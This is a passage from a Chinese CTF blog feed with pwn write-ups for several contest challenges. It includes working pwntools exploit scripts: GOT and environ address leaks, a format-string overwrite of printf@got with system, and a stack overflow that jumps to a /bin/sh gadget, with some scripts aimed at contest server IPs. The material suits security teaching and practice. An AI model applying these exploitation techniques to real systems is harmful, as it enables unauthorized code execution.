<p>先根据got去libc database，然后确认libc，然后去泄露libc.symbols[“environ”]，这个里边存的是栈地址。</p>
<h4 id="第一次-leak-puts函数地址"><a href="#第一次-leak-puts函数地址" class="headerlink" title="第一次 leak puts函数地址"></a>第一次 leak puts函数地址</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You should take more effort to get six sence, and one more challenge!!\n"</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_real<span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
</code></pre>
<p>通过 puts_addr 查找libc版本</p>
<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/2.jpg" alt="2"></p>
<h4 id="第二次-leak-environ"><a href="#第二次-leak-environ" class="headerlink" title="第二次 leak environ"></a>第二次 leak environ</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">environ <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You should take more effort to get six sence, and one more challenge!!\n"</span><span class="token punctuation">)</span>
flag_addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
flag_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x168</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
</code></pre>
<h4 id="第三次-leak-flag"><a href="#第三次-leak-flag" class="headerlink" title="第三次 leak flag"></a>第三次 leak flag</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./GUESS'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'GUESS'</span><span class="token punctuation">)</span>

libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>

puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'You should take more effort to get six sence, and one more challenge!!\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

puts <span class="token operator">=</span>  u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>

environ <span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>environ<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You should take more effort to get six sence, and one more challenge!!\n"</span><span class="token punctuation">)</span>

flag_addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">33</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>
flag_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x168</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">300</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
<p>得到flag</p>
<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/3.jpg" alt="3"></p>
<h2 id="第二场"><a href="#第二场" class="headerlink" title="第二场"></a>第二场</h2><h3 id="easyFMT"><a href="#easyFMT" class="headerlink" title="easyFMT"></a>easyFMT</h3><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec <span class="token function">fmt</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/fmt'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
ios@ubuntu:~$
</code></pre>
<p>NX开启</p>
<p>载入ida分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+8h] [ebp-70h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+6Ch] [ebp-Ch]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Do you know repeater?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x64u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//漏洞存在点</span>
    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>很显然的字符串格式化漏洞利用</p>
<p>先来进行测试偏移</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ ./fmt 
Do you know repeater?
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAA.0xffab5268.0x64.0xf7dc88fb.0xffab528e.0xffab538c.0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025
�a��
</code></pre>
<p>看到距离AAAA 6个偏移处得到地址0x41414141 </p>
<p>利用偏移地址打印，打印出got表 从而获得libc版本 进而获得system地址</p>
<p>leak puts_addr</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./fmt'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'fmt'</span><span class="token punctuation">)</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token operator">+</span><span class="token string">'%6$s'</span><span class="token operator">+</span><span class="token string">'#'</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>
puts <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
</code></pre>
<p>获取libc版本</p>
<p><img src="/2018/08/22/网鼎杯部分PWN-Writeup/1.jpg" alt="1"></p>
<p>计算获得system_addr</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">system_addr<span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
</code></pre>
<h3 id="EXP编写思路"><a href="#EXP编写思路" class="headerlink" title="EXP编写思路"></a>EXP编写思路</h3><ul>
<li><p>确定格式化字符串参数偏移</p>
</li>
<li><p>利用put@got获取put函数地址，进而获取对应的libc.so的版本，进而获取对应system函数地址。</p>
</li>
<li><p>修改printf@got的内容为system的地址。</p>
</li>
<li><p>当程序再次执行printf函数的时候，其实执行的是system函数。</p>
</li>
</ul>
<p>利用pwntools自带工具修改</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">payload1 <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>printf_got<span class="token punctuation">:</span> system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#p = process('./fmt')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'106.75.126.184'</span><span class="token punctuation">,</span><span class="token number">58579</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'fmt'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib32/libc.so.6'</span><span class="token punctuation">)</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'#'</span><span class="token operator">+</span><span class="token string">'%6$s'</span><span class="token operator">+</span><span class="token string">'#'</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>


puts <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span>
system_addr<span class="token operator">=</span> puts<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

payload1 <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>printf_got<span class="token punctuation">:</span> system_addr<span class="token punctuation">}</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>

<span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="fgo"><a href="#fgo" class="headerlink" title="fgo"></a>fgo</h3><p> pwnable.tw 原题</p>
<p>过几天认真做做==</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;第一场&quot;&gt;&lt;a href=&quot;#第一场&quot; class=&quot;headerlink&quot; title=&quot;第一场&quot;&gt;&lt;/a&gt;第一场&lt;/h2&gt;&lt;h3 id=&quot;GUESS&quot;&gt;&lt;a href=&quot;#GUESS&quot; class=&quot;headerlink&quot; title=&quot;GUESS&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>西电线下赛PWN-writeup</title>
    <link href="http://iosmosis.github.io/2018/07/23/%E8%A5%BF%E7%94%B5%E7%BA%BF%E4%B8%8B%E8%B5%9BPWN-writeup/"/>
    <id>http://iosmosis.github.io/2018/07/23/西电线下赛PWN-writeup/</id>
    <published>2018-07-22T18:25:32.000Z</published>
    <updated>2018-07-24T16:09:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>比赛结束了…垃圾的我拿了第六 菜归菜 但是也要继续学习orz</p>
<p>感谢每一位西电的学长</p>
<h2 id="PWN1-EZ"><a href="#PWN1-EZ" class="headerlink" title="PWN1  EZ"></a>PWN1  EZ</h2><p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec ez
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/ez'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
    RWX:      Has RWX segments
</code></pre>
<p>保护全关 64位elf</p>
<p>我们IDA分析下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>

  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Guess what I think!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"233 or 666"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">233</span> <span class="token punctuation">)</span>
    <span class="token function">sub_400726</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">666</span> <span class="token punctuation">)</span>
    <span class="token function">sub_400737</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">5438</span> <span class="token punctuation">)</span>
    <span class="token function">sub_400748</span><span class="token punctuation">(</span><span class="token number">5438LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>main函数中 读完代码你可以发现 puts(“233 or 666”);这里让你输入233或者666 对应内容也可以去跟进函数查看到，这里传入v4=5438时会跳转到sub_400748该函数 我们跟进分析下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_400748</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You find my secret!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"So,Tell me your name!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  result <span class="token operator">=</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have remembered you, %s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">==</span> <span class="token number">233</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>漏洞很明显在read函数处  32位下的话应该是有两解变量覆盖及rop 具体可以参考iscc的WP <a href="http://www.lovei.org/archives/ISCC2018.html#pwn1" target="_blank" rel="external">ISCC-login</a> (ORZ)所以此题利用方式类似 就不在赘述了  （大晚上写wp有点累 偷个懒0.0）</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#p = process('ez')本地测试...</span>
<span class="token comment" spellcheck="true">#p = remote('192.168.3.222',10001)内网线下</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'118.25.227.117'</span><span class="token punctuation">,</span><span class="token number">10001</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#外网目前可用</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5438'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4007A1</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>尝试运行</p>
<p><img src="/2018/07/23/西电线下赛PWN-writeup/1.jpg" alt="1"></p>
<h2 id="PWN2-stack-relro"><a href="#PWN2-stack-relro" class="headerlink" title="PWN2  stack-relro"></a>PWN2  stack-relro</h2><p>感谢因幡师傅 感谢去去去师傅~</p>
<p>顺便推一下如果你也喜欢CTF真的很推荐来西电 学长们很友好也很愿意耐心解答问题</p>
<p>那我们继续看题</p>
<p>检查保护</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec relro
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/relro'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre>
<p>开启 RELRO NX  </p>
<p>RELRO分为Full RELRO和Partial RELRO </p>
<p>开启<em>FULL_RELRO</em>后，GOT表只能读   限制了修改got表 </p>
<p>我们载入ida分析下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">_int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rdi</span>
